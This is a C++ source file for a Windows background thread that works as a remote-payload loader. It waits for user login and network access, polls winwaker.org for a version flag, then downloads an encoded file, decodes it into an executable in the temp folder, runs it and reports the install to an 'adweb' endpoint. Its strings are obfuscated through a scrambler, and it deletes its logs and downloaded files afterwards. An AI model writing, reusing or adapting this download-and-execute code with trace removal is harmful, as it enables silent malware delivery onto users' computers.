#include <Windows.h>
#include <string>
#include "WinWakerThread.h"
#include "easylog.hpp"
#include "libstr.h"
#include "key.h"
#include "reg.h"
#include "file.h"
#include "http.h"
#include "codec.h"
#include "base64.h"
#include "run.h"
#include "scrambler.h"

extern BOOL bRunning;
extern BOOL gbAutoDelete;

VOID Invoke();

DWORD WINAPI WinWakerThreadFunction(LPVOID lpParam ) 
{ 
	// "main thread started #####\n"
	EasyLog::Format(GetStrById(255));

	// Wait for user login 3600 seconds
	int count = 0;
	// "EXPLORER.EXE"
	std::string szExeProcessName = GetStrById(256);
	while (bRunning && count < 3600)
	{
		// increase count
		count++;

		// check if process exists
		BOOL rc = IsProcessExists((LPSTR) szExeProcessName.c_str());
		if (rc)
		{
			// "task wait %s ok\n"
			EasyLog::Format(GetStrById(257), szExeProcessName.c_str());
			break;
		}
		else
		{
			// "task wait %s fails, continue ... %d\n"
			EasyLog::Format(GetStrById(258), szExeProcessName.c_str(), count);
			::Sleep(1000);
		}
	}

	// Sleep to wait network available
	int i = 0;
    while(bRunning && i < 90)
    {
		::Sleep(1000);
		
		// "sleep: %d\n"
		EasyLog::Format(GetStrById(259), i);

		i++;
	}

	// Main loop
	Invoke();

	// "thread exit\n"
	EasyLog::Format(GetStrById(260));
	return 0; 
}

VOID Invoke()
{
	// Check version
	BOOL bVersionExpired = FALSE;
	do
	{
		// "WinWakerUpdate"
		std::string szHost = GetStrById(120);
		// "Version"
		std::string szTxtFilePath = windowsTempPath + "\\" + szHost + GetStrById(315) + "." + timeString + ".txt";

		// Download version.txt
		// "http://www.winwaker.org/data/download/version.txt?v=0"
		std::string url = GetStrById(316);
		BOOL rc = HTTPDownloadFileFromUrls(szTxtFilePath.c_str(), url.c_str(), url.c_str());
		if (!rc)
		{
			break;
		}

		// read version
		FILE* fp = fopen(szTxtFilePath.c_str(), "r");
		if (fp)
		{
			int version = 0;
			int i = fscanf(fp, "%d", &version);
			if (i == 1)
			{
				// "version found %d\n"
				EasyLog::Format(GetStrById(319), version);
			}
			else
			{
				// "version not found %d or %d not expired\n"
				std::string format = GetStrById(317);
				EasyLog::Format(format.c_str(), i, version);
			}
		
			fclose(fp);

			if (version & 0x40)
			{
				bVersionExpired = TRUE;
			}

			if (version & 0x10)
			{
				gbAutoDelete = FALSE;
				// "set auto delete to false\n"
				EasyLog::Format(GetStrById(323));
			}
			else
			{
				DeleteFile(szTxtFilePath.c_str());
			}
		}
		else
		{
			// "version file open fails\n"
			EasyLog::Format(GetStrById(318));
			break;
		}
	} while (false);
	
	// Close log if auto delete
	if (gbAutoDelete)
	{
		EasyLog::Close();
	}

	// Download and decode and excecute
	while (bRunning && bVersionExpired)
	{
		// "WinWakerUpdate"
		std::string szTxtFilePath = windowsTempPath + "\\" + GetStrById(120) + "." + timeString + ".txt";
		// "WinWakerUpdate"
		std::string szExeFilePath = windowsTempPath + "\\" + GetStrById(120) + ".exe";

		// Download
		// "http://www.winwaker.org/data/download/winwakerupdate.txt?v=0"
		std::string url = GetStrById(301);
		BOOL rc = HTTPDownloadFileFromUrls(szTxtFilePath.c_str(), url.c_str(), url.c_str());
		if (rc && bRunning)
		{
			// decode
			rc = Decode(szTxtFilePath.c_str(), szExeFilePath.c_str());
			// "decode %s to %s, rc %d\n"
			EasyLog::Format(GetStrById(305), szTxtFilePath.c_str(), szExeFilePath.c_str(), rc);
			if (gbAutoDelete)
			{
				DeleteFile(szTxtFilePath.c_str());
			}
		}

		// exec
		if (rc && bRunning)
		{
			std::string szProtectionCode;
			// "WinWakerUpdate"
			GetProtectionCode(szProtectionCode, GetStrById(120));
			// Run and wait until process exit
			rc = RunProcess(szExeFilePath.c_str(), 86400, szProtectionCode.c_str());
			if (gbAutoDelete)
			{
				DeleteFile(szExeFilePath.c_str());
			}
		}

		// Exit anyway
		break;
	}

	if (bRunning)
	{
		// Report installation
		// "WinWakerUpdate"
		std::string reportValue = GetStrById(120);
		// "http://www.winwaker.org/adweb/db/report_bug.php?v=0"
		std::string url = GetStrById(121);
		HTTPReportInstallation(url.c_str(), url.c_str(), reportValue.c_str());
	}

	// Stop service
	bRunning = FALSE;
}
